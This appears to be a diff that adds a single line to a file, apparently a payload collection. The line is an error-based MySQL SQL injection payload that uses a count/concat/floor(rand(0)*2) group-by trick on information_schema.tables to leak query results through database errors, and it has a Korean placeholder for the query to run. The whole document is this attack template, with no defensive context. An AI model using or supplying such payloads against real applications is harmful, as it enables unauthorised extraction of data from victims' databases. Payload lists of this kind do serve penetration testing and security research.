@@ -1,0 +1,1 @@
+' and (select 1 from(select count(*),concat((SQL 쿼리문), floor(rand(0)*2))a from information_schema.tables group by a limit 0,1)b) #
